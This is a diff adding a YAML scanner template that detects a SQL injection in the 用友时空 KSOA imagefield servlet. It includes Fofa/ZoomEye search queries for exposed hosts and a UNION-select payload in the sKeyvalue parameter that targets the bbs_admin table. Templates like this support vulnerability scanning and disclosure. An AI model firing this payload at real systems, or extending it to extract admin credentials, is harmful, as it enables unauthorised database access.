@@ -1,0 +1,20 @@
+id: yonyou-ksoa-servletimagefield-skeyvalue-sqli
+
+info:
+  name: 用友时空 KSOA servletimagefield 文件 sKeyvalue 参数SQL 注入漏洞
+  author: Observer
+  severity: high
+  verified: true
+  description: |-
+    Fofa: app="用友-时空KSOA"
+    ZoomEye: app:"用友时空KSOA"
+  tags: yonyou,ksoa,sqli
+  created: 2023/12/07
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+
+    expression: response.status == 200 && response.body.bcontains(b'0x098f6bc') 
+expression: r0()
